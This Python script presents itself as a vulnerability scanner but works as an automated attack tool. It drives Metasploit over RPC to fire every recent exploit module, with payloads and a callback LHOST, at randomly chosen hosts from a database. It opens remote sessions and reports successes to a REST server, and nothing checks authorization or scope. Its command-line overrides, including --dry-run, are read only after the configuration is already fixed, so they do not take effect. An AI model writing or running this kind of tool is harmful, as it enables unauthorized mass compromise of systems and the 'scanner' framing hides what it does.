#!/usr/bin/python3
"""
Enhanced Vulnerability Scanner Client
Extends thearm_uzi with REST API integration to a Flask server
"""
import os
import psutil
import time
import socket
import subprocess
import psycopg2
import requests
import json
import argparse
import logging
from pymetasploit3.msfrpc import MsfRpcClient
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("scanner.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("enhanced-scanner")

# Configuration
class Config:
    # PostgreSQL configuration
    PG_USER = os.getenv("PG_USER", "postgres")
    PG_PASSWORD = os.getenv("PG_PASSWORD", "")  # Default empty for security
    PG_DBNAME = os.getenv("PG_DBNAME", "msf")
    PG_HOST = os.getenv("PG_HOST", "postgres")
    
    # Metasploit RPC configuration
    MSF_RPC_HOST = os.getenv("MSF_RPC_HOST", "localhost")
    MSF_RPC_PORT = int(os.getenv("MSF_RPC_PORT", "55553"))
    MSF_RPC_PASSWORD = os.getenv("MSF_RPC_PASSWORD", "")
    MSF_RPC_SSL = os.getenv("MSF_RPC_SSL", "true").lower() == "true"
    
    # REST API Flask server configuration
    API_SERVER_URL = os.getenv("API_SERVER_URL", "http://localhost:5000")
    API_KEY = os.getenv("API_KEY", "")
    
    # Scanner operation mode
    # 0 = Dry run (no payload execution)
    # 1 = Full execution with payload
    MODE_RUN = int(os.getenv("MODE_RUN", "0"))
    
    # Target OS type (Linux, Windows, etc.)
    TARGET_OS = os.getenv("TARGET_OS", "Linux")
    
    # Minimum date for exploits (YYYY-MM-DD)
    MIN_EXPLOIT_DATE = os.getenv("MIN_EXPLOIT_DATE", "2021-01-01")
    
    # Scan settings
    SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", "60"))  # seconds between hosts
    
    @classmethod
    def validate(cls):
        """Validate critical configuration parameters"""
        if not cls.PG_PASSWORD:
            logger.warning("PostgreSQL password not set! Using empty password.")
        
        if not cls.MSF_RPC_PASSWORD:
            logger.warning("Metasploit RPC password not set! Using empty password.")
            
        if not cls.API_KEY:
            logger.warning("API key not set! Authentication with REST API may fail.")

# Database operations class
class DatabaseManager:
    def __init__(self, config):
        self.config = config
        self.conn = None
    
    def connect(self):
        """Establish connection to PostgreSQL database"""
        try:
            self.conn = psycopg2.connect(
                dbname=self.config.PG_DBNAME, 
                user=self.config.PG_USER, 
                password=self.config.PG_PASSWORD, 
                host=self.config.PG_HOST
            )
            logger.info(f"Connected to PostgreSQL database at {self.config.PG_HOST}")
            return True
        except psycopg2.Error as e:
            logger.error(f"Failed to connect to PostgreSQL: {e}")
            return False
    
    def disconnect(self):
        """Close database connection"""
        if self.conn:
            self.conn.close()
            logger.info("Disconnected from PostgreSQL database")
    
    def get_random_host(self, os_type):
        """Get a random host of specified OS type from the database"""
        try:
            if not self.conn or self.conn.closed:
                if not self.connect():
                    return None, None
                
            with self.conn.cursor() as cur:
                cur.execute(
                    f"SELECT id, address FROM hosts WHERE os_name = %s ORDER BY RANDOM() LIMIT 1;",
                    (os_type,)
                )
                result = cur.fetchone()
                if result:
                    logger.info(f"Selected random host: {result[1]} (ID: {result[0]})")
                    return result
                else:
                    logger.warning(f"No hosts found with OS type: {os_type}")
                    return None, None
        except psycopg2.Error as e:
            logger.error(f"Error retrieving random host: {e}")
            return None, None
    
    def update_host_scan_status(self, host_id, status, details=None):
        """Update host scan status in database"""
        try:
            if not self.conn or self.conn.closed:
                if not self.connect():
                    return False
                
            with self.conn.cursor() as cur:
                cur.execute(
                    "UPDATE hosts SET last_scanned = %s, scan_status = %s, scan_details = %s WHERE id = %s",
                    (datetime.now(), status, json.dumps(details) if details else None, host_id)
                )
                self.conn.commit()
                logger.debug(f"Updated scan status for host ID {host_id}: {status}")
                return True
        except psycopg2.Error as e:
            logger.error(f"Error updating host scan status: {e}")
            return False

# REST API client for Flask server
class ApiClient:
    def __init__(self, config):
        self.config = config
        self.base_url = config.API_SERVER_URL
        self.headers = {
            "Content-Type": "application/json",
            "X-API-Key": config.API_KEY
        }
    
    def test_connection(self):
        """Test connection to API server"""
        try:
            response = requests.get(f"{self.base_url}/api/status", headers=self.headers, timeout=5)
            if response.status_code == 200:
                logger.info(f"Successfully connected to API server at {self.base_url}")
                return True
            else:
                logger.error(f"API server returned status code {response.status_code}")
                return False
        except requests.RequestException as e:
            logger.error(f"Failed to connect to API server: {e}")
            return False
    
    def register_scan(self, host_id, host_address):
        """Register a new scan with the API server"""
        try:
            data = {
                "host_id": host_id,
                "host_address": host_address,
                "start_time": datetime.now().isoformat(),
                "scanner_id": socket.gethostname()
            }
            response = requests.post(
                f"{self.base_url}/api/scans", 
                headers=self.headers,
                json=data,
                timeout=10
            )
            if response.status_code in (200, 201):
                scan_id = response.json().get("scan_id")
                logger.info(f"Registered scan ID {scan_id} for host {host_address}")
                return scan_id
            else:
                logger.error(f"Failed to register scan: {response.status_code} - {response.text}")
                return None
        except requests.RequestException as e:
            logger.error(f"Error during scan registration: {e}")
            return None
    
    def update_scan_status(self, scan_id, status, details=None):
        """Update scan status with the API server"""
        try:
            data = {
                "status": status,
                "timestamp": datetime.now().isoformat(),
                "details": details
            }
            response = requests.put(
                f"{self.base_url}/api/scans/{scan_id}", 
                headers=self.headers,
                json=data,
                timeout=10
            )
            if response.status_code == 200:
                logger.debug(f"Updated scan status for ID {scan_id}: {status}")
                return True
            else:
                logger.error(f"Failed to update scan status: {response.status_code} - {response.text}")
                return False
        except requests.RequestException as e:
            logger.error(f"Error during scan status update: {e}")
            return False
    
    def report_vulnerability(self, scan_id, exploit_name, result):
        """Report a discovered vulnerability to the API server"""
        try:
            data = {
                "scan_id": scan_id,
                "exploit_name": exploit_name,
                "result": result,
                "timestamp": datetime.now().isoformat()
            }
            response = requests.post(
                f"{self.base_url}/api/vulnerabilities", 
                headers=self.headers,
                json=data,
                timeout=10
            )
            if response.status_code in (200, 201):
                logger.info(f"Reported vulnerability for scan {scan_id}: {exploit_name}")
                return True
            else:
                logger.error(f"Failed to report vulnerability: {response.status_code} - {response.text}")
                return False
        except requests.RequestException as e:
            logger.error(f"Error during vulnerability reporting: {e}")
            return False

# Metasploit integration class
class MetasploitManager:
    def __init__(self, config):
        self.config = config
        self.client = None
        self.console = None
        self.console_id = None
    
    def connect(self):
        """Connect to Metasploit RPC server"""
        try:
            self.client = MsfRpcClient(
                self.config.MSF_RPC_PASSWORD,
                server=self.config.MSF_RPC_HOST,
                port=self.config.MSF_RPC_PORT,
                ssl=self.config.MSF_RPC_SSL
            )
            logger.info(f"Connected to Metasploit RPC at {self.config.MSF_RPC_HOST}:{self.config.MSF_RPC_PORT}")
            self.console_id = self.client.consoles.console().cid
            self.console = self.client.consoles.console(self.console_id)
            logger.debug(f"Created Metasploit console with ID: {self.console_id}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect to Metasploit RPC: {e}")
            return False
    
    def search_exploits(self, os_type):
        """Search for exploits targeting specific OS"""
        try:
            logger.info(f"Searching for {os_type} exploits...")
            search_results = self.client.modules.search(os_type)
            valid_exploits = []
            
            for result in search_results:
                # Skip non-exploit modules
                if result.get('type') != 'exploit':
                    continue
                
                # Skip older exploits
                disclosure_date = result.get('disclosuredate')
                if not disclosure_date or disclosure_date < self.config.MIN_EXPLOIT_DATE:
                    continue
                
                valid_exploits.append(result)
            
            logger.info(f"Found {len(valid_exploits)} valid {os_type} exploits")
            return valid_exploits
        except Exception as e:
            logger.error(f"Error searching for exploits: {e}")
            return []
    
    def run_exploit(self, exploit_data, target_host, use_payload=False):
        """Run a Metasploit exploit against target host"""
        exploit_name = exploit_data.get('fullname', 'unknown')
        logger.info(f"Setting up exploit: {exploit_name}")
        
        try:
            # Load the exploit module
            exploit = self.client.modules.use('exploit', exploit_name)
            exploit.target = 0
            
            # Get available payloads
            payloads = exploit.targetpayloads()
            if not payloads and use_payload:
                logger.warning(f"No payloads available for {exploit_name}")
                return {
                    "status": "skipped",
                    "reason": "no_payloads",
                    "exploit": exploit_name
                }
            
            # Handle required options
            missing = exploit.missing_required
            for option in missing:
                if option == "RHOSTS":
                    exploit[option] = target_host
                elif option == "TARGET_PATH":
                    exploit[option] = "/"
                elif option == "SESSION":
                    exploit[option] = 1
                elif option == "LHOST":
                    exploit[option] = "1.1.1.1"  # This should be your actual attacker IP
                else:
                    logger.warning(f"Unhandled required option: {option}")
                    return {
                        "status": "skipped",
                        "reason": f"missing_option_{option}",
                        "exploit": exploit_name
                    }
            
            # Execute the exploit
            if use_payload and payloads:
                selected_payload = payloads[0]  # Use first payload
                logger.info(f"Running {exploit_name} with payload {selected_payload}")
                result = self.console.run_module_with_output(exploit, selected_payload)
            else:
                logger.info(f"Running {exploit_name} without payload")
                result = self.console.run_module_with_output(exploit)
            
            # Wait for execution to complete
            while self.console.is_busy():
                logger.debug("Waiting for exploit execution...")
                time.sleep(1)
            
            # Check for successful execution
            if "Exploit completed" in result:
                logger.info(f"Exploit {exploit_name} completed successfully")
                return {
                    "status": "success",
                    "output": result,
                    "exploit": exploit_name,
                    "payload": selected_payload if use_payload and payloads else None
                }
            else:
                logger.info(f"Exploit {exploit_name} failed")
                return {
                    "status": "failed",
                    "output": result,
                    "exploit": exploit_name
                }
                
        except Exception as e:
            logger.error(f"Error running exploit {exploit_name}: {e}")
            return {
                "status": "error",
                "reason": str(e),
                "exploit": exploit_name
            }
    
    def get_active_sessions(self):
        """Get list of active Metasploit sessions"""
        try:
            sessions = self.client.sessions.list
            logger.info(f"Active sessions: {len(sessions)}")
            return sessions
        except Exception as e:
            logger.error(f"Error retrieving sessions: {e}")
            return {}

# System utility functions
def kill_process_by_name(process_name):
    """Kill processes by name"""
    killed = []
    for proc in psutil.process_iter(['pid', 'name']):
        if process_name in proc.info['name']:
            try:
                proc2kill = psutil.Process(proc.info['pid'])
                proc2kill.terminate()
                proc2kill.wait(timeout=3)
                logger.info(f"Process {process_name} (PID: {proc.info['pid']}) terminated")
                killed.append(proc.info['pid'])
            except psutil.NoSuchProcess:
                logger.error(f"Process {process_name} no longer exists")
            except psutil.AccessDenied:
                logger.error(f"Access denied terminating process {process_name} (PID: {proc.info['pid']})")
            except psutil.TimeoutExpired:
                logger.error(f"Timeout expired terminating process {process_name} (PID: {proc.info['pid']})")
    return killed

def is_postgres_ready(host, user, dbname):
    """Check if PostgreSQL is ready"""
    try:
        result = subprocess.run(
            ["pg_isready", "-h", host, "-U", user, "-d", dbname],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        return result.returncode == 0
    except Exception as e:
        logger.error(f"PostgreSQL readiness check failed: {e}")
        return False

# Main scanner class
class VulnerabilityScanner:
    def __init__(self, config):
        self.config = config
        self.db_manager = DatabaseManager(config)
        self.api_client = ApiClient(config)
        self.msf_manager = MetasploitManager(config)
        self.running = False
        self.stats = {
            "hosts_scanned": 0,
            "exploits_attempted": 0,
            "exploits_succeeded": 0,
            "sessions_created": 0
        }
    
    def initialize(self):
        """Initialize all components"""
        logger.info("Initializing vulnerability scanner...")
        
        # Validate configuration
        Config.validate()
        
        # Test API server connection
        if not self.api_client.test_connection():
            logger.warning("Continuing without API server connection")
        
        # Connect to database
        if not self.db_manager.connect():
            logger.error("Failed to connect to database. Exiting.")
            return False
        
        # Connect to Metasploit
        if not self.msf_manager.connect():
            logger.error("Failed to connect to Metasploit RPC. Exiting.")
            return False
        
        logger.info("Initialization complete")
        return True
    
    def scan_host(self, host_id, host_address):
        """Scan a specific host for vulnerabilities"""
        logger.info(f"Starting scan of host {host_address} (ID: {host_id})")
        
        # Register scan with API server
        scan_id = self.api_client.register_scan(host_id, host_address)
        
        # Update host status in database
        self.db_manager.update_host_scan_status(host_id, "scanning")
        
        # Search for applicable exploits
        exploits = self.msf_manager.search_exploits(self.config.TARGET_OS)
        
        # Track successful exploits
        successful_exploits = []
        
        # Update scan status
        if scan_id:
            self.api_client.update_scan_status(
                scan_id, 
                "in_progress", 
                {"total_exploits": len(exploits)}
            )
        
        # Run each exploit against the host
        for i, exploit in enumerate(exploits):
            logger.info(f"Exploit {i+1}/{len(exploits)}: {exploit.get('fullname')}")
            
            # Run the exploit
            result = self.msf_manager.run_exploit(
                exploit, 
                host_address,
                use_payload=(self.config.MODE_RUN == 1)
            )
            
            self.stats["exploits_attempted"] += 1
            
            # Report result to API server
            if scan_id:
                self.api_client.update_scan_status(
                    scan_id,
                    "running_exploit",
                    {
                        "current": i+1,
                        "total": len(exploits),
                        "exploit": exploit.get('fullname')
                    }
                )
                
                # Report vulnerability if successful
                if result.get("status") == "success":
                    self.api_client.report_vulnerability(
                        scan_id, 
                        exploit.get('fullname'),
                        result
                    )
                    successful_exploits.append(result)
                    self.stats["exploits_succeeded"] += 1
        
        # Check for any new sessions
        sessions = self.msf_manager.get_active_sessions()
        new_sessions = len(sessions)
        self.stats["sessions_created"] += new_sessions
        
        # Update final scan status
        if scan_id:
            self.api_client.update_scan_status(
                scan_id,
                "completed",
                {
                    "exploits_attempted": len(exploits),
                    "exploits_succeeded": len(successful_exploits),
                    "sessions_created": new_sessions
                }
            )
        
        # Update host status in database
        scan_details = {
            "scan_id": scan_id,
            "exploits_attempted": len(exploits),
            "exploits_succeeded": len(successful_exploits),
            "sessions_created": new_sessions,
            "timestamp": datetime.now().isoformat()
        }
        self.db_manager.update_host_scan_status(host_id, "scanned", scan_details)
        
        logger.info(f"Completed scan of host {host_address}")
        self.stats["hosts_scanned"] += 1
        
        return {
            "host_id": host_id,
            "host_address": host_address,
            "exploits_attempted": len(exploits),
            "exploits_succeeded": len(successful_exploits),
            "sessions_created": new_sessions
        }
    
    def run(self):
        """Run the vulnerability scanner"""
        if not self.initialize():
            return False
        
        self.running = True
        logger.info("Starting vulnerability scanner...")
        
        try:
            while self.running:
                # Get a random host to scan
                host_id, host_address = self.db_manager.get_random_host(self.config.TARGET_OS)
                
                if not host_id or not host_address:
                    logger.warning(f"No {self.config.TARGET_OS} hosts available. Waiting...")
                    time.sleep(self.config.SCAN_INTERVAL)
                    continue
                
                # Scan the host
                result = self.scan_host(host_id, host_address)
                
                # Log scan results
                logger.info(f"Scan stats: {self.stats}")
                
                # Wait before next scan
                logger.info(f"Waiting {self.config.SCAN_INTERVAL} seconds before next scan...")
                time.sleep(self.config.SCAN_INTERVAL)
                
        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt, shutting down...")
            self.running = False
        except Exception as e:
            logger.error(f"Error in scanner main loop: {e}")
            self.running = False
        finally:
            self.shutdown()
        
        return True
    
    def shutdown(self):
        """Clean shutdown of scanner"""
        logger.info("Shutting down vulnerability scanner...")
        self.db_manager.disconnect()
        logger.info(f"Final statistics: {self.stats}")
        logger.info("Scanner shutdown complete")

# Command-line interface
def parse_arguments():
    parser = argparse.ArgumentParser(description="Enhanced Vulnerability Scanner")
    parser.add_argument("--dry-run", action="store_true", help="Run in dry-run mode (no exploit execution)")
    parser.add_argument("--target-os", default=None, help="Target OS type (Linux, Windows, etc.)")
    parser.add_argument("--api-server", default=None, help="API server URL")
    parser.add_argument("--api-key", default=None, help="API key for authentication")
    parser.add_argument("--msf-host", default=None, help="Metasploit RPC host")
    parser.add_argument("--msf-port", type=int, default=None, help="Metasploit RPC port")
    parser.add_argument("--msf-password", default=None, help="Metasploit RPC password")
    parser.add_argument("--pg-host", default=None, help="PostgreSQL host")
    parser.add_argument("--pg-user", default=None, help="PostgreSQL user")
    parser.add_argument("--pg-password", default=None, help="PostgreSQL password")
    parser.add_argument("--pg-dbname", default=None, help="PostgreSQL database name")
    return parser.parse_args()

# Main function
def main():
    # Parse command line arguments
    args = parse_arguments()
    
    # Apply command line overrides to configuration
    if args.dry_run:
        os.environ["MODE_RUN"] = "0"
    if args.target_os:
        os.environ["TARGET_OS"] = args.target_os
    if args.api_server:
        os.environ["API_SERVER_URL"] = args.api_server
    if args.api_key:
        os.environ["API_KEY"] = args.api_key
    if args.msf_host:
        os.environ["MSF_RPC_HOST"] = args.msf_host
    if args.msf_port:
        os.environ["MSF_RPC_PORT"] = str(args.msf_port)
    if args.msf_password:
        os.environ["MSF_RPC_PASSWORD"] = args.msf_password
    if args.pg_host:
        os.environ["PG_HOST"] = args.pg_host
    if args.pg_user:
        os.environ["PG_USER"] = args.pg_user
    if args.pg_password:
        os.environ["PG_PASSWORD"] = args.pg_password
    if args.pg_dbname:
        os.environ["PG_DBNAME"] = args.pg_dbname
    
    # Create configuration
    config = Config()
    
    # Create and run scanner
    scanner = VulnerabilityScanner(config)
    scanner.run()

if __name__ == "__main__":
    main()
